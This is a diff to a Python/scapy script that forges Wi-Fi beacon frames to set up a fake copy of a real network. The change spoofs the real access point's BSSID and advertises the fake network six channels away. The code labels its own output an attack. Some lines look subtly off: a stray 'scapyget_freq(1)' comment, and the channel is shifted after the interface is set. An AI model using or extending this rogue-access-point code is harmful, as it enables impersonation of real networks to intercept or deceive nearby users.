@@ -101,10 +101,12 @@ else:
 
 	# Creating new fake network six channel next to real one
 	#ch = (ch + 6) % 14
-	os.system(f"iwconfig {iface} channel {ch}") # 
+	os.system(f"iwconfig {iface} channel {ch}")
+
+	ch = (ch + 6) % 14
 
 	# Build packet with scapyget_freq(1)
-	p = RadioTap() / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr3=RandMAC()) / Dot11Beacon() / Dot11Elt(ID="SSID", info=ssid, len=len(ssid)) / Dot11Elt(ID="DSset", info=(b"\x01"))
+	p = RadioTap() / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / Dot11Beacon() / Dot11Elt(ID="SSID", info=ssid, len=len(ssid)) / Dot11Elt(ID="DSset", info=chr(ch))
 	
 	print(f"\nCreating new network {ssid} on channel {ch}")
 	print("Press <ctrl + C> to stop attack")
